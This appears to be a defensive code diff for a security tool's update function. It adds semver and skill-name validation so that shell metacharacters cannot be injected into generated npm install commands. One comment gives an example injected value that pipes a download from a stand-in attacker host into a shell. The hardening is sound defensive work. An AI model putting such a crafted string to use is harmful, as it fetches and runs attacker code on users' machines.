@@ -796,14 +796,32 @@ export async function applyUpdates(args: z.infer<typeof ApplyUpdatesSchema>): Pr
   const commands: string[] = [];
 
   if (latestMcpVersion) {
+    // CWE-20 / TM-004: latestMcpVersion is caller-supplied (not guaranteed to come from
+    // fetchLatestMcpVersion which validates against SEMVER_RE). A compromised npm
+    // registry response or a direct MCP call could inject shell metacharacters into the
+    // command string. Even though applyUpdates only *returns* commands (never execs them),
+    // a crafted string like "1.0.0; curl attacker.com|sh" would be surfaced to the user
+    // for copy-paste execution. Reject non-semver versions defensively.
+    if (!SEMVER_RE.test(latestMcpVersion)) {
+      throw new Error(
+        `applyUpdates: latestMcpVersion "${latestMcpVersion}" is not a valid semver string. ` +
+        `Refusing to generate update commands to prevent command injection.`
+      );
+    }
     commands.push(`npm install -g security-mcp@${latestMcpVersion}`);
     commands.push(`security-mcp install`);
   }
 
   if (skillUpdates?.length) {
+    // CWE-20: validate skillName before interpolating into command strings
+    const safeSkills = skillUpdates.filter((s) => SAFE_SKILL_NAME_RE.test(s.skillName));
+    const rejectedCount = skillUpdates.length - safeSkills.length;
+    if (rejectedCount > 0) {
+      console.warn(`[applyUpdates] Rejected ${rejectedCount} skill(s) with unsafe names.`);
+    }
     commands.push(
       `# Re-download updated skills (handled automatically next time /ciso-orchestrator runs)`,
-      ...skillUpdates.map((s) => `# skill: ${s.skillName} will be refreshed via orchestration.ensure_skill`)
+      ...safeSkills.map((s) => `# skill: ${s.skillName} will be refreshed via orchestration.ensure_skill`)
     );
   }
 
